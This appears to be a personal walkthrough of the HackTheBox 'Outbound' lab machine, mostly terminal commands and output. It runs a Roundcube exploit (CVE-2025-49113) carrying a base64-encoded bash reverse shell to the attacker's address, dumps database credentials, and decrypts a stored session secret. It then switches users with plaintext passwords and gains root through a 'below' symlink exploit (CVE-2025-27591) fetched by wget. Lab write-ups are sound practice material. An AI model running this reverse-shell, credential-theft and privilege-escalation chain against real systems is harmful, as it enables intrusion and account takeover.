@@ -1,0 +1,233 @@
+
+// These are provided to us 
+      Credentials :
+       tyler / LhKL1o9Nm3X2
+
+[ Nmap ]
+nmap -p- -A --min-rate=1000 -o nmap0.txt 10.10.11.77
+Nmap scan report for 10.10.11.77
+Host is up (0.096s latency).
+Not shown: 65533 closed tcp ports (reset)
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://mail.outbound.htb/
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 199/tcp)
+HOP RTT      ADDRESS
+1   94.80 ms 10.10.14.1
+2   96.09 ms 10.10.11.77
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct 21 06:13:23 2025 -- 1 IP address (1 host up) scanned in 92.17 seconds
+__________________________________________________________________________________________________________________________________________
+# after that we ran nuclei and discovered a CVE
+
+┌──(kali㉿kali)-[~/HAckthebox/Outbound]
+└─$ nuclei -u http://mail.outbound.htb/                       
+    < redacted >
+__________________________________________________________________________________________________________________________________________
+# so we use a script to abuse this vuln that can be found here:
+https://github.com/hakaioffsec/CVE-2025-49113-exploit
+
+[ Using the script...]
+┌──(kali㉿kali)-[~/HAckthebox/Outbound/CVE-2025-49113-exploit]
+└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler  LhKL1o9Nm3X2 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU2LzQ0NDQgMD4mMSkgJg== | base64 -d | bash'
+
+[+] Starting exploit (CVE-2025-49113)...
+[*] Checking Roundcube version...
+[*] Detected Roundcube version: 10610
+[+] Target is vulnerable!
+[+] Login successful!
+[*] Exploiting...
+[+] Gadget uploaded successfully!
+
+# that KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU2LzQ0NDQgMD4mMSkgJg== is based 64 encoded of bash (reverse) shell
+__________________________________________________________________________________________________________________________________________
+[ Got a shell...]
+┌──(kali㉿kali)-[~/HAckthebox/Outbound/CVE-2025-49113-exploit]
+└─$ pwncat -l 4444
+ls
+bin
+bin.usr-is-merged
+boot
+dev
+etc
+home 
+< redacted >
+____________________________________________________________________
+# rough...
+cd root
+bash: line 2: cd: root: Permission denied
+cd home
+ls
+jacob
+mel
+tyler
+cd tyler
+bash: line 5: cd: tyler: Permission denied
+cd jacob
+bash: line 6: cd: jacob: Permission denied
+cd mel
+bash: line 7: cd: mel: Permission denied
+____________________________________________________________________
+ # but we have tyler's password
+su tyler
+Password: LhKL1o9Nm3X2
+id
+uid=1000(tyler) gid=1000(tyler) groups=1000(tyler)
+____________________________________________________________________
+# debugging... 
+ls / -al
+total 84
+drwxr-xr-x   1 root root 4096 Jul  9 12:41 .
+drwxr-xr-x   1 root root 4096 Jul  9 12:41 ..
+-rwxr-xr-x   1 root root    0 Jun  8 12:26 .dockerenv
+lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Mar 31  2024 bin.usr-is-merged
+drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
+drwxr-xr-x   5 root root  340 Oct 20 19:33 dev
+drwxr-xr-x   1 root root 4096 Jul  9 12:41 etc
+drwxr-xr-x   1 root root 4096 Jun  8 12:05 home
+lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
+drwxr-xr-x   2 root root 4096 Nov 14  2024 lib.usr-is-merged
+lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
+drwxr-xr-x   2 root root 4096 May 29 02:14 media
+drwxr-xr-x   2 root root 4096 May 29 02:14 mnt
+drwxr-xr-x   2 root root 4096 May 29 02:14 opt
+dr-xr-xr-x 325 root root    0 Oct 20 19:33 proc
+drwx------   1 root root 4096 Jun  8 15:39 root
+drwxr-xr-x   1 root root 4096 Jun  6 18:55 run
+lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Mar 31  2024 sbin.usr-is-merged
+drwxr-xr-x   2 root root 4096 May 29 02:14 srv
+dr-xr-xr-x  13 root root    0 Oct 21 01:41 sys
+drwxrwxrwt   1 root root 4096 Oct 21 10:19 tmp
+drwxr-xr-x  12 root root 4096 May 29 02:14 usr
+drwxr-xr-x   1 root root 4096 Jun  6 18:55 var
+____________________________________________________________________
+ls -al
+total 32
+drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .
+drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..
+drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
+drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
+drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
+____________________________________________________________________
+d /var/www/html/roundcube/config
+ls
+config.inc.php
+config.inc.php.sample
+defaults.inc.php
+mimetypes.php
+____________________________________________________________________
+cat config.inc.php
+[ Shows some credentials  ]
+____________________________________________________________________
+
+#Quering SQL 
+ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
+[ Results are credentials ]
+________________________________________________________________________________________________________________________________________
+#Further
+ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
+[ Results are credentials ]
+
+# the latest result shows the base64 value
+________________________________________________________________________________________________________________________________________
+[ I had no idea what to do so my friend told me ]
+# In the earlier config.inc.php we found a des_key, and in the session we also extracted an auth_secret.
+# After gathering information, it was discovered Triple DES was used.
+
+[ So what do we do?? ]
+# chatgpt
+        # You have two needed pieces: a key (des_key) from config and an auth_secret value stored in session.
+        # The auth_secret value is stored/base64-encoded. Decode it from base64 to raw bytes.
+        # Interpret the raw bytes as: the first 8 bytes = IV (initialization vector), the rest = ciphertext. (This is typical for 3DES in CBC mode when the IV is prepended.)
+        # Use Triple DES (3DES / DES-EDE) in CBC mode with the discovered key and that IV to decrypt the ciphertext.
+[ Then we switch user to jacob where we find his password in a mail...,  the mail can be found in an INBOX directroy called jacob ]
+________________________________________________________________________________________________________________________________________
+#switching user
+su jacob
+Password: 595mO8DmwGeD
+whoami
+jacob
+
+cat jacob
+[ Results are found in jcob_mail.txt and there we find ssh password ]
+____________________________________________________________________
+# SSH
+
+┌──(kali㉿kali)-[~/HAckthebox/Outbound/CVE-2025-49113-exploit]
+└─$ ssh jacob@outbound.htb
+jacob@outbound:~$ ls
+a.py  exp.py  payload  snapshot_01761015049_01761015049.ZPwLAL  snapshot_01761015294_01761015294.VgwWg5  snapshot_01761027160_01761027160.gdzQu7
+a.sh  exp.sh  poc.sh   snapshot_01761015292_01761015292.TvDrry  snapshot_01761026333_01761026333.DeKQaV  user.txt
+________________________________________________________________________________________________________________________________________
+# Privilege escalation
+sudo -l
+Matching Defaults entries for jacob on outbound:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+________________________________________________________________________________________________________________________________________
+[After searching, the actual method is: CVE-2025-27591 ]
+
+we use : https://github.com/BridgerAlderson/CVE-2025-27591-PoC
+
+[ After cloning the repo in our own system... ]
+________________________________________________________________________________________________________________________________________
+[ From our machine...]
+ - cd CVE-2025-27591-PoC
+ - python3 -m http.server 80
+____________________________________________________________________
+[ From vulnerable system a.k.a htb box where we're sshed or shell ]
+
+1- wget http://ip/exploit.py
+2-python exploit.py
+____________________________________________________________________
+# This makes us root 
+
+jacob@outbound:~$ ls
+error_root.log  exploit.py  exploit.py.1  payload  root2  user.txt
+jacob@outbound:~$ python3 exploit.py
+[*] Checking for CVE-2025-27591 vulnerability...
+[+] /var/log/below is world-writable.
+[!] /var/log/below/error_root.log is a regular file. Removing it...
+[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
+[+] Target is vulnerable.
+[*] Starting exploitation...
+[+] Wrote malicious passwd line to /tmp/attacker
+[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
+[*] Executing 'below record' as root to trigger logging...
+Oct 24 14:45:42.598 DEBG Starting up!
+Oct 24 14:45:42.598 ERRO
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01761264000: EAGAIN: Try again
+-------------------------------------------------------------
+[+] 'below record' executed.
+[*] Appending payload into /etc/passwd via symlink...
+[+] Payload appended successfully.
+[*] Attempting to switch to root shell via 'su attacker'...
+root@outbound:/home/jacob# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@outbound:/home/jacob# cd /root
+root@outbound:~# ls
+root.txt
+root@outbound:~#
+
+[ Lesson = Github exploits Priv Very Nicely ]
+________________________________________________________________________________________________________________________________________
